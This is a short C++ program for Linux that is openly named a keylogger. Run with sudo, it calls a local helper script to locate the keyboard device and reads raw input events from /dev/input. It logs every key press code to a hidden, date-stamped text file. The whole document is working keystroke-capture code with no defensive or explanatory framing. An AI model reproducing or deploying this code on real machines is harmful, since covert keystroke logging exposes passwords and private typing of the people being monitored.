#include <fstream>
#include "stdio.h"
#include <list>
#include <map>
#include <string>
#include <linux/input.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <list>

//RUN WITH SUDO

int main(int argc, char ** argv){

    time_t today = time(NULL);
    struct tm * todayDate = localtime(&today);
    std::ofstream file(
        "."+std::to_string(todayDate->tm_mon) + "." 
        + std::to_string(todayDate->tm_mday) + "." 
        + std::to_string(todayDate->tm_year + 1900) + ".KeyLogger.txt");
    FILE * ptrDev = popen("~/Documents/Programming/CPP/findDevice.sh", "r");
    char buffer[256];
    std::string device(fgets(buffer,256, ptrDev));
    device.pop_back();
    pclose(ptrDev);
	std::string dev = "/dev/input/" + device;// std::to_string(device);// + device;
    struct input_event ev;
    std::ifstream keyz(dev);
    char data[sizeof(ev)];
    while(true){
        keyz.read(data, sizeof(ev));
        memcpy(&ev, data, sizeof(ev)); //copies mom values of data to struct ev
        if(ev.type == EV_KEY) { //if keyboard key
            std::cout << ev.value << " " << ev.code << std::endl;
            file << ev.value << " " << ev.code << std::endl;
        }
    }
    
    file.close();
    keyz.close();
    return 0;
}
